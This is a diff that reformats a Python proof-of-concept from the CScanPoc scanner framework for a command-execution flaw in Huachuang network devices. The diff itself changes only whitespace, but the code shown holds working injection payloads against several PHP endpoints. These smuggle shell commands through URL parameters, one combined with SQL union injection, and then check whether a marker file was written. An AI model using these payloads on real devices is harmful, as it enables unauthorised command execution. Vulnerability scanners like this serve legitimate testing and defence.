@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Huachuang_0003'  # 平台漏洞编号，留空
     name = '华创设备 命令执行'  # 漏洞名称
@@ -37,7 +38,8 @@ class Poc(ABPoc):
             payloads = [
                 #arg + 'acc/network/redial_pppoe.php?wan=a|echo%20testvul>testvul.txt||',
                 #arg + 'acc/debug/bytecache_run_action.php?action=1&engine=test%27|echo%20testvul>testvul.txt||%27a',
-                arg + '/acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1%27%20and%200%20union%20select%20%27a||echo%20testvul>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1',
+                arg + \
+                '/acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1%27%20and%200%20union%20select%20%27a||echo%20testvul>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1',
                 arg + '/acc/tools/enable_tool_debug.php?val=0&tool=1&par=-c%201%20localhost%20|%20echo%20testvul>testvul.txt%20||%20a',
             ]
             verifys = [
@@ -55,13 +57,14 @@ class Poc(ABPoc):
                     if response1.status_code == 200 and 'testvul' in response1.content:
                         #print payload+"存在命令执行漏洞"
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞，，漏洞地址为{url}'.format(
-                        target=self.target, name=self.vuln.name, url=verify))
+                            target=self.target, name=self.vuln.name, url=verify))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
